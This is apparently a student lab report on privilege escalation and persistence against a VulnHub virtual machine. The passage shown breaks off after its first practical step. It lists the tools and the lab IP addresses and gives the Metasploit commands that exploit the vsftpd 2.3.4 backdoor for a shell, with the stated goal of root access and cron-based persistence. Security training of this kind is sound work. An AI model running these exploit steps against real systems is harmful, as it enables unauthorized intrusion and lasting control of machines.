# TASK 03 REPORT – Privilege Escalation and Persistence Lab

## 1. Objective
The goal of this task is to perform privilege escalation on a vulnerable machine, gain root access, and establish persistence. This task includes system enumeration using LinPEAS, identifying SUID vulnerabilities, exploiting them for root access, and creating persistence using a cron job.

---

## 2. Tools Used
- **Metasploit Framework**
- **LinPEAS**
- **Linux Built-in Commands**
  - `find`
  - `id`
  - `whoami`
  - `chmod`
  - `cron`

---

## 3. Lab Environment Details
| Component        | Details                      |
|------------------|------------------------------|
| Attacker Machine | Kali Linux                   |
| Attacker IP      | `192.168.75.135`             |
| Target Machine   |Vulnerable Linux VM (VulnHub) |
| Target IP        | `192.168.75.131`             |

---

## 4. Practical Work Performed

### 4.1 Initial Access Using Metasploit
Metasploit was used to exploit a vulnerable FTP service to obtain a shell session.

#### Commands Used
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.75.131
run
